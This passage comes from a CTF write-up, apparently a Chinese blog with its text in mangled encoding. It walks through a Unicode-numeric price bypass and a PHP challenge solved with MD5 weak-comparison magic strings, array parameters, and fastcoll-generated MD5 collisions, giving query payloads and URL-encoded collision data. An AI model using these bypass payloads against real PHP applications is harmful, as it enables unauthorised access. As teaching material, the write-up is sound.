class="token punctuation">)</span>  File <span class="token string">"/app/sshop/views/Shop.py"</span><span class="token punctuation">,</span> line <span class="token number">34</span><span class="token punctuation">,</span> <span class="token keyword">in</span> post    unicodedata<span class="token punctuation">.</span>numeric<span class="token punctuation">(</span>price<span class="token punctuation">)</span>TypeError<span class="token punctuation">:</span> need a single Unicode character <span class="token keyword">as</span> parameter</code></pre><p>éœ€è¦ä¸€ä¸ªUnicodeå­—ç¬¦ä½œä¸ºå‚æ•°ï¼Œå†å›åˆ°å‰é¢çœ‹çœ‹æºç ï¼Œæœ‰æç¤ºï¼š</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token comment">&lt;!--Ah,really important,seriously. --></span></code></pre><p>äºæ˜¯æˆ‘ä»¬å¯»æ‰¾åˆ°æ¯”1337å¤§çš„<code>Unicode</code>å­—ç¬¦<code>U+4E07</code>ï¼Œ<code>utf-8</code>ç¼–ç åçš„16è¿›åˆ¶ä¸º<code>E4 B8 87</code>ï¼Œåœ¨å‰é¢åŠ å…¥<code>%</code>å¾—åˆ°<code>%E4%B8%87</code>ä¼ å…¥å³å¯</p><h1 id="PHPå¼±ç±»å‹"><a href="#PHPå¼±ç±»å‹" class="headerlink" title="PHPå¼±ç±»å‹"></a>PHPå¼±ç±»å‹</h1><h2 id="å®‰æ’æœˆèµ›â€”web2-hash"><a href="#å®‰æ’æœˆèµ›â€”web2-hash" class="headerlink" title="å®‰æ’æœˆèµ›â€”web2_hash"></a>å®‰æ’æœˆèµ›â€”web2_hash</h2><p>æœ¬é¢˜å‚è€ƒï¼š</p><blockquote><p><a href="https://www.gem-love.com/ctf/1799.html#web2_hash">2020äºŒæœˆå®‰æ’æœˆèµ›æŠ—ç–«ç»ƒä¹ èµ›webé¢˜ç›®writeup</a><br><a href="https://xz.aliyun.com/t/4741#toc-7">2019æ˜å®‰æ¯web7 writeup</a><br><a href="https://xz.aliyun.com/t/2232">ç¬¬äºŒå±Šå¼ºç½‘æ¯ MD5ç¢°æ’ writeup</a></p></blockquote><p>è¿›æ¥å…ˆçœ‹ç•Œé¢ä»£ç ï¼š</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$val1</span> <span class="token operator">=</span> @<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'val1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$val2</span> <span class="token operator">=</span> @<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'val2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$val3</span> <span class="token operator">=</span> @<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'val3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$val4</span> <span class="token operator">=</span> @<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'val4'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$val5</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span>@<span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'val5'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$val6</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span>@<span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'val6'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$val7</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span>@<span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'val7'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token variable">$val1</span> <span class="token operator">==</span> <span class="token variable">$val2</span> <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'val1 OR val2 no no no'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$val1</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$val2</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'step 1 fail'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token variable">$val3</span> <span class="token operator">==</span> <span class="token variable">$val4</span> <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'val3 OR val4 no no no'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$val3</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$val4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'step 2 fail'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token variable">$val5</span> <span class="token operator">==</span> <span class="token variable">$val6</span> <span class="token operator">||</span> <span class="token variable">$val5</span> <span class="token operator">==</span> <span class="token variable">$val7</span> <span class="token operator">||</span> <span class="token variable">$val6</span> <span class="token operator">==</span> <span class="token variable">$val7</span> <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'val5 OR val6 OR val7 no no no'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$val5</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$val6</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">md5</span><span class="token punctuation">(</span><span class="token variable">$val6</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$val7</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">md5</span><span class="token punctuation">(</span><span class="token variable">$val5</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$val7</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'step 3 fail'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"come on!"</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$m</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'m'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$n</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'n'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token function">ctype_alnum</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">5</span><span class="token punctuation">)</span>  <span class="token operator">||</span> <span class="token operator">!</span><span class="token punctuation">(</span><span class="token function">ctype_alnum</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"a OR b fail!"</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$m</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$n</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"m OR n fail"</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$val8</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$val9</span> <span class="token operator">=</span> <span class="token function">strtr</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$m</span><span class="token punctuation">,</span> <span class="token variable">$n</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token constant">PHP_EOL</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;p>val8 : <span class="token interpolation"><span class="token variable">$val8</span></span>&lt;/p>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token constant">PHP_EOL</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;p>val9 : <span class="token interpolation"><span class="token variable">$val9</span></span>&lt;/p>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token constant">PHP_EOL</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$val8</span> <span class="token operator">==</span> <span class="token variable">$val9</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">===</span> <span class="token variable">$b</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"nice,good job,give you flag:"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/var/www/html/flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p>ä»£ç å®¡è®¡ä¸€ä¸ªä¸€ä¸ªç»•</p><p>ç¬¬1ã€2ä¸ªifï¼š<code>val1</code>ä¸èƒ½å’Œ<code>val2</code>ä¸€æ ·ï¼Œä¸”<code>val1</code>å’Œ<code>val2</code>çš„MD5å€¼éœ€è¦ç›¸åŒï¼Œç”±äºè¿™é‡Œæ˜¯ç”¨<code>!=</code>è¿›è¡Œåˆ¤æ–­çš„ï¼Œäºæ˜¯å°±å¯ä»¥ç”¨MD5å¼±æ¯”è¾ƒè¿›è¡Œç»•è¿‡ï¼›è¿™é‡Œç»™å‡ºä¸¤ä¸ªå¯ä»¥ç»•è¿‡æ¯”è¾ƒçš„å­—ç¬¦ä¸²<code>s878926199a</code>å’Œ<code>s155964671a</code>ã€payloadï¼š<code>?val1=s878926199a&amp;val2=s155964671a</code>ã€éšåè¿›å…¥ä¸‹ä¸ªifï¼ˆå½“ç„¶è¿™é‡Œä¹Ÿå¯ä»¥ç”¨æ•°ç»„ç»•è¿‡ï¼Œä¸‹ä¸¤ä¸ªifè§£é‡Šï¼‰</p><blockquote><p>æ³¨ï¼š<code>s878926199a</code>çš„MD5å€¼ä¸º<code>0e545993274517709034328855841020</code>ï¼Œ<code>s155964671a</code>çš„MD5å€¼ä¸º<code>0e342768416822451524974117254469</code>å‡½æ•°åœ¨æ‰§è¡Œ<code>!=</code>åˆ¤æ–­çš„æ—¶å€™ä¼šè®¤ä¸ºæ˜¯ä»¥<code>0e</code>å¼€å¤´çš„ç§‘å­¦è®¡æ•°æ³•ï¼Œæ‰€ä»¥ä¸¤è¾¹éƒ½ä¸º0ï¼Œå³æ„æˆäº†å¼±æ¯”è¾ƒç»•è¿‡</p></blockquote><p>ç¬¬3ã€4ä¸ªifï¼š<code>val3</code>ä¸èƒ½å’Œ<code>val4</code>ä¸€æ ·ï¼Œä¸”<code>val3</code>å’Œ<code>val4</code>çš„MD5å€¼éœ€è¦ç›¸åŒï¼Œè€Œè¿™é‡Œä½¿ç”¨çš„æ˜¯<code>!==</code>è¿›è¡Œåˆ¤æ–­ï¼Œè¿™ç§åˆ¤æ–­ä¼šå¯¹MD5åŠ å¯†åçš„å­—ç¬¦ä¸²è¿›è¡Œä¸¥æ ¼çš„é€ä¸ªå­—ç¬¦åˆ¤æ–­ï¼Œæ‰€ä»¥ä½¿ç”¨ä¸Šé¢çš„æ–¹æ³•æ˜¯æ— æ•ˆçš„ï¼Œä½†æ˜¯è¿™é‡Œå¯ä»¥ä½¿ç”¨æ•°ç»„ç±»å‹è¿›è¡Œç»•è¿‡ï¼Œç”±äºMD5å‡½æ•°æ— æ³•å¤„ç†æ•°ç»„ï¼Œæ‰€ä»¥ä¸¤è¾¹è¿”å›çš„éƒ½æ˜¯<code>NULL</code>ï¼ˆä¸Šä¸¤ä¸ªifä¹Ÿé€‚ç”¨ï¼‰ï¼Œå°±æ„æˆäº†ç»•è¿‡ï¼›payloadï¼š<code>?val1=s878926199a&amp;val2=s155964671a&amp;val3[]=1&amp;val4[]=2</code></p><p>ç¬¬5ã€6ä¸ªifï¼šè¿™é‡Œçš„å‡½æ•°éœ€è¦è®©<code>val5</code>ã€<code>val6</code>ã€<code>val7</code>éƒ½ä¸ç›¸ç­‰ï¼Œä¸”ä¸‰ä¸ªå€¼çš„MD5å€¼éœ€è¦ç›¸åŒï¼Œå¹¶ä¸”ä½¿ç”¨çš„æ˜¯<code>!==</code>è¿›è¡Œåˆ¤æ–­ï¼Œä¸”åœ¨è·å–æ•°å€¼çš„æ—¶å€™è¿›è¡Œäº†<code>string</code>ç±»å‹è½¬æ¢ï¼Œå¦‚æœæ˜¯æ•°ç»„çš„è¯ä¼šç›´æ¥è½¬æ¢ä¸æˆåŠŸï¼Œä¸‰ä¸ªå€¼æ²¡å¾—åˆ°ä¸œè¥¿ï¼Œç¬¬ä¸€ä¸ªåˆ¤æ–­éƒ½è¿‡ä¸äº†ï¼Œè¿™é‡Œå°±éœ€è¦æ‰¾åˆ°ä¸‰ä¸ªçœŸæ­£ç›¸ç­‰çš„MD5å€¼çš„åŸå‹ï¼Œè¿™é‡Œå°±éœ€è¦å‚è€ƒä¸€ç¯‡æ–‡ç« ï¼š<a href="https://xz.aliyun.com/t/3161#toc-5">åŸºäºå…¨ç­‰çš„MD5ç¢°æ’ç»•è¿‡</a>ã€å¦‚æ–‡ç« æ‰€è¿°ï¼ˆcmdä¸­æ‰§è¡Œï¼‰ï¼š</p><pre class="language-shell" data-language="shell"><code class="language-shell">fastcoll_v1.0.0.5.exe -o <span class="token number">0</span> <span class="token number">1</span>    -oå‚æ•°ä»£è¡¨éšæœºç”Ÿæˆä¸¤ä¸ªç›¸åŒMD5çš„æ–‡ä»¶fastcoll_v1.0.0.5.exe -p <span class="token number">1</span> -o 00 01    -på‚æ•°ä»£è¡¨æ ¹æ®1æ–‡ä»¶éšæœºç”Ÿæˆä¸¤ä¸ªç›¸åŒMD5çš„æ–‡ä»¶ï¼Œæ³¨æ„ï¼šç”Ÿæˆçš„MD5ä¸1ä¸åŒtail.exe -c <span class="token number">128</span> 00 <span class="token operator">></span> a    -c <span class="token number">128</span>ä»£è¡¨å°†00çš„æœ€å128ä½å†™å…¥æ–‡ä»¶aï¼Œè¿™128ä½æ­£æ˜¯1ä¸00çš„MD5ä¸åŒçš„åŸå› tail.exe -c <span class="token number">128</span> 01 <span class="token operator">></span> b    åŒç†<span class="token builtin class-name">type</span> <span class="token number">0</span> a <span class="token operator">></span> <span class="token number">10</span>    è¿™é‡Œè¡¨ç¤ºå°†0å’Œaæ–‡ä»¶çš„å†…å®¹åˆå¹¶å†™å…¥10<span class="token builtin class-name">type</span> <span class="token number">0</span> b <span class="token operator">></span> <span class="token number">11</span>    è¿™é‡Œè¡¨ç¤ºå°†0å’Œbæ–‡ä»¶çš„å†…å®¹åˆå¹¶å†™å…¥11</code></pre><p><a href="http://www.win.tue.nl/hashclash/fastcoll_v1.0.0.5.exe.zip">fastcollä¸‹è½½é“¾æ¥</a>ã€<a href="https://www.trisunsoft.com/tail-for-windows.htm">tail.exeä¸‹è½½é“¾æ¥</a></p><p>è¿™æ ·å°±ç”Ÿæˆäº†4ä¸ªMD5å€¼ç›¸åŒçš„æ–‡ä»¶ï¼ŒæŸ¥çœ‹å››ä¸ªæ–‡ä»¶çš„MD5å€¼ï¼Œæ˜¯é¢„æœŸç»“æœ</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200227120733977.png" alt loading="lazy"></p><p>äºæ˜¯åœ¨PHPä¸­ç”Ÿæˆå…¶ä¸­ä¸‰ä¸ªçš„urlencodeçš„å€¼ï¼š</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">function</span>  <span class="token function-definition function">readmyfile</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$fh</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$fh</span><span class="token punctuation">,</span> <span class="token function">filesize</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$fh</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$data</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'äºŒè¿›åˆ¶hash '</span><span class="token operator">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">readmyfile</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>&lt;br>\r\n"</span><span class="token punctuation">;</span><span class="token keyword">echo</span>  <span class="token string single-quoted-string">'URLENCODE '</span><span class="token operator">.</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">readmyfile</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>&lt;br>\r\n"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'URLENCODE hash '</span><span class="token operator">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">urlencode</span> <span class="token punctuation">(</span><span class="token function">readmyfile</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>&lt;br>\r\n"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'äºŒè¿›åˆ¶hash '</span><span class="token operator">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">readmyfile</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"10"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>&lt;br>\r\n"</span><span class="token punctuation">;</span><span class="token keyword">echo</span>  <span class="token string single-quoted-string">'URLENCODE '</span><span class="token operator">.</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">readmyfile</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"10"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>&lt;br>\r\n"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'URLENCODE hash '</span><span class="token operator">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">readmyfile</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"10"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>&lt;br>\r\n"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'äºŒè¿›åˆ¶hash '</span><span class="token operator">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">readmyfile</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"11"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>&lt;br>\r\n"</span><span class="token punctuation">;</span><span class="token keyword">echo</span>  <span class="token string single-quoted-string">'URLENCODE '</span><span class="token operator">.</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">readmyfile</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"11"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>&lt;br>\r\n"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'URLENCODE hash '</span><span class="token operator">.</span><span class="token function">md5</span><span class="token punctuation">(</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">readmyfile</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"11"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>&lt;br>\r\n"</span><span class="token punctuation">;</span></span></code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200227121027756.png" alt loading="lazy"></p><pre class="language-HTML" data-language="HTML"><code class="language-HTML">äºŒè¿›åˆ¶hash 4e7b1d0c72b69df7992d15f72f7c2056URLENCODE %E5WVVB%15%C6%E6%BD%A8%3C%07E+%3C%92l%95hWq%23%FEn%1CbxRk%AE%07%F1v%03%C1%E7%D0dG7%CB%0F%E1%1B%D4%C9K%F6%F3%81%18%FA%D3%21%7E%CB%7D%FB%B6%C2l%5C%8D2%8F%04%97%83%3ARz%19%D7hf.%04%11%E6%81%5DE%D6%9C2%2C%0Fkv%D9%D3%DBOP%2BA%E1h%B8%8E%04l%82%1E%1D%BDkY%92%93I%01%21%24%B9%D7%EDb%97Hk%21%5DX6%8Aq%11%DC%0DD%F7%11%A0QUC%7C%F2%AD%AEn%FD%01%C9%0F%27%1B%E2%D1%06%88%1B%CEyR%A7%1A7%BCL%BB%AF%DF%D8%AB%1B%2A%E7%FB%D0s%D5%8B%05jh%FE%8A%BCc%9F%16%2A%A6%93%0A%AB%8BR%2A%22%14%06%BF%00%DFS%A2%D8%B5%039%F5%D5CZ%F5%AA%88Q%DE%25%7D+%19%CD%9B%F5%CC%D9%29%5D%B2%BB%7E%97%FA7%E6%7E%E0%A7%AF%CC%AF%7D%C1o%CA%CA%9F%CB%27F%7DL%E9%C0%D3%DA%3Cm%14%3C%81URLENCODE hash c09ff9138646c9e4ad9234d07ed6f935äºŒè¿›åˆ¶hash 4e7b1d0c72b69df7992d15f72f7c2056URLENCODE %E5WVVB%15%C6%E6%BD%A8%3C%07E+%3C%92l%95h%D7q%23%FEn%1CbxRk%AE%07%F1v%03%C1%E7%D0dG7%CB%0F%E1%1B%D4IK%F6%F3%81%18%FA%D3%21%7E%CB%7D%FB%B6Bl%5C%8D2%8F%04%97%83%3ARz%19%D7hf.%04%11%E6%81%5DE%D6%1C2%2C%0Fkv%D9%D3%DBOP%2BA%E1h%B8%8E%04l%82%1E%1D%BDkY%92%13J%01%21%24%B9%D7%EDb%97Hk%21%5D%D86%8Aq%11%DC%0DD%F7%11%A0QUC%7C%F2%AD%AEn%FD%01%C9%0F%27%1B%E2%D1%06%88%1B%CEyR%A7%1A7%BCL%BB%AF%DF%D8%AB%1B%2A%E7%FB%D0s%D5%8B%05jh%FE%8A%BCc%9F%16%2A%A6%93%0A%AB%8BR%2A%22%14%06%BF%00%DFS%A2%D8%B5%039%F5%D5CZ%F5%AA%88Q%DE%25%7D+%19%CD%9B%F5%CC%D9%29%5D%B2%BB%7E%97%FA7%E6%7E%E0%A7%AF%CC%AF%7D%C1o%CA%CA%9F%CB%27F%7DL%E9%C0%D3%DA%3Cm%14%3C%81URLENCODE hash 6b9eaae07963a665dcc4cabcad530507äºŒè¿›åˆ¶hash 4e7b1d0c72b69df7992d15f72f7c2056URLENCODE %E5WVVB%15%C6%E6%BD%A8%3C%07E+%3C%92l%95h%D7q%23%FEn%1CbxRk%AE%07%F1v%03%C1%E7%D0dG7%CB%0F%E1%1B%D4IK%F6%F3%81%18%FA%D3%21%7E%CB%7D%FB%B6Bl%5C%8D2%8F%04%97%83%3ARz%19%D7hf.%04%11%E6%81%5DE%D6%1C2%2C%0Fkv%D9%D3%DBOP%2BA%E1h%B8%8E%04l%82%1E%1D%BDkY%92%13J%01%21%24%B9%D7%EDb%97Hk%21%5D%D86%8Aq%11%DC%0DD%F7%11%A0QUC%7C%F2%AD%AEn%FD%01%C9%0F%27%9B%E2%D1%06%88%1B%CEyR%A7%1A7%BCL%BB%AF%DF%D8%AB%1B%2A%E7%FB%D0s%D5%0B%06jh%FE%8A%BCc%9F%16%2A%A6%93%0A%2B%8BR%2A%22%14%06%BF%00%DFS%A2%D8%B5%039%F5%D5CZ%F5%AA%88Q%5E%25%7D+%19%CD%9B%F5%CC%D9%29%5D%B2%BB%7E%97%FA7%E6%7E%E0%A7%AF%CC%AF%7DAo%CA%CA%9F%CB%27F%7DL%E9%C0%D3%DA%BCm%14%3C%81URLENCODE hash 